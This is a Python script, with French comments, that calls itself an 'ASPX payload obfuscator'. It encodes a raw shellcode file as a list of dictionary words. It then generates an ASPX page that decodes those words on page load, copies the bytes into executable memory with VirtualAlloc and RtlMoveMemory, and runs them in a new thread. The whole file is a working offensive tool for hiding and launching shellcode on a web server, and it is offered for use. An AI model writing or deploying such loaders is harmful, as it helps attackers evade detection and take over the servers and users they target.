#!/usr/bin/env python3

import requests
import sys
import random
import os
import glob

def get_wordlist(wordlist_source):
    # Si c'est une URL, on télécharge
    if wordlist_source.startswith("http://") or wordlist_source.startswith("https://"):
        response = requests.get(wordlist_source)
        words = response.content.splitlines()
        words = [w.decode("utf-8") for w in words]
    # Sinon, on lit le fichier local
    else:
        with open(wordlist_source, 'r') as f:
            words = [line.strip() for line in f if line.strip()]
    return words

def select_wordlist():
    # Chemin vers le dossier des wordlists
    wordlist_dir = "wordlists"
    # Vérifier si le dossier existe
    if not os.path.exists(wordlist_dir):
        print(f"Le dossier {wordlist_dir} n'existe pas.")
        return "https://www.mit.edu/~ecprice/wordlist.10000"
    
    # Récupérer toutes les wordlists dans le dossier
    wordlist_files = glob.glob(os.path.join(wordlist_dir, "*.txt"))
    if not wordlist_files:
        print(f"Aucune wordlist trouvée dans {wordlist_dir}.")
        return "https://www.mit.edu/~ecprice/wordlist.10000"
    
    # Afficher le menu des wordlists
    print("\nWordlists disponibles :")
    for i, wordlist in enumerate(wordlist_files, 1):
        print(f"{i}. {os.path.basename(wordlist)}")
    print(f"{len(wordlist_files) + 1}. Utiliser une URL ou un chemin personnalisé")
    
    # Demander à l'utilisateur de choisir
    while True:
        try:
            choice = int(input("\nEntrez le numéro de votre choix : "))
            if 1 <= choice <= len(wordlist_files):
                return wordlist_files[choice - 1]
            elif choice == len(wordlist_files) + 1:
                custom_source = input("Entrez l'URL ou le chemin vers la wordlist : ")
                return custom_source
            else:
                print(f"Veuillez entrer un numéro entre 1 et {len(wordlist_files) + 1}")
        except ValueError:
            print("Veuillez entrer un numéro valide.")

def main(input_file, wordlist_source=None):
    # Si aucune wordlist n'est fournie, afficher le menu de sélection
    if wordlist_source is None:
        wordlist_source = select_wordlist()

    # 1. Charger la wordlist
    words = get_wordlist(wordlist_source)
    random.shuffle(words)
    hex_values = [f'0x{i:02x}' for i in range(256)]
    word_dict = dict(zip(hex_values, words[:256]))
    
    # 2. Encoder le payload
    encoded_words = []
    with open(input_file, "rb") as f:
        for b in f.read():
            hexval = f"0x{b:02x}"
            encoded_words.append(word_dict[hexval])

    # Diviser en chunks pour la concaténation
    chunk_size = 80
    encoded_chunks = [" ".join(encoded_words[i:i+chunk_size]) for i in range(0, len(encoded_words), chunk_size)]

    # 3. Générer le code ASPX
    aspx_code = """<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Collections.Generic" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<script runat="server">
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll")]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("kernel32.dll")]
    public static extern void RtlMoveMemory(IntPtr dest, byte[] src, int length);

    protected void Page_Load(object sender, EventArgs e)
    {
        // --- BEGIN OBFUSCATED PAYLOAD ---
        string sc = "";
"""

    for chunk in encoded_chunks:
        aspx_code += f'        sc += "{chunk} ";\n'

    # Générer le mapping
    aspx_code += "        var wordDict = new Dictionary<string, byte>();\n"
    for k, v in word_dict.items():
        aspx_code += f'        wordDict.Add("{v}", {k});\n'

    aspx_code += """
        sc = sc.Trim();
        string[] arr = sc.Split(' ');
        byte[] buf = new byte[arr.Length];
        for(int i=0;i<arr.Length;i++){
            if(wordDict.ContainsKey(arr[i])) buf[i]=wordDict[arr[i]];
            else buf[i]=0;
        }

        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
        RtlMoveMemory(addr, buf, buf.Length);

        uint threadId;
        IntPtr hThread = CreateThread(IntPtr.Zero,0,addr,IntPtr.Zero,0,out threadId);
        WaitForSingleObject(hThread, 0xFFFFFFFF);

        Response.Write("[+] Payload exécuté");
    }
</script>

<html><body><h1>Obfuscated Loader Ready</h1></body></html>
"""

    with open("generated_code.aspx", "w") as f:
        f.write(aspx_code)

    print("Fichier ASPX généré dans 'generated_code.aspx'.")

if __name__ == "__main__":
    print("##############################################")
    print("########### ASPX PAYLOAD OBFUSCATOR ##########")
    print("##############################################\n")
    if len(sys.argv) < 2:
        print("Usage: python encode_aspx.py <path_to_raw_payload_file> [<path_or_url_to_wordlist>]\n")
        sys.exit(1)
    
    file_path = sys.argv[1]
    wordlist_source = sys.argv[2] if len(sys.argv) > 2 else None
    main(file_path, wordlist_source)